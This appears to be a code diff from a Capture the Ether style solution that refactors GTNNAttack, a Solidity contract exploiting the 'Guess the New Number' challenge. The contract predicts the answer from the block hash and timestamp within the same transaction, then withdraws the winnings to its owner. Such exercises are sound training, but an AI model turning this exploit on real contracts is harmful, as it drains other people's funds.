@@ -20,35 +20,26 @@ contract GuessTheNewNumberChallenge {
 }
 
 contract GTNNAttack {
-    GuessTheNewNumberChallenge public gtnn;
-    address public creator; //payable not available till Solidity v0.5
+    address owner;
 
-    function GTNNAttack(address _addr) public {
-        gtnn = GuessTheNewNumberChallenge(_addr);
-        creator = msg.sender;
-        // hackExecute();
+    function GTNNAttack() public {
+        owner = msg.sender;
     }
 
-    // function predict() public view returns (uint8) {
-    //     return uint8(keccak256(block.blockhash(block.number - 1), now));
-    // }
-
-    function hack() public payable {
+    function guess(address _challenge) public payable {
         require(msg.value == 1 ether);
-        uint8 ans = uint8(keccak256(block.blockhash(block.number - 1), now));
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
 
-        gtnn.guess.value(msg.value)(ans);
+        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(
+            _challenge
+        );
+        challenge.guess.value(msg.value)(answer);
     }
 
-    // function() public payable {
-    //     creator.transfer(msg.value);
-    // }
+    function() public payable {}
 
     function withdraw() public {
-        creator.transfer(address(this).balance);
+        require(msg.sender == owner);
+        owner.transfer(address(this).balance);
     }
-
-    // function fallback() public payable {
-    //     creator.transfer(msg.value);
-    // }
 }
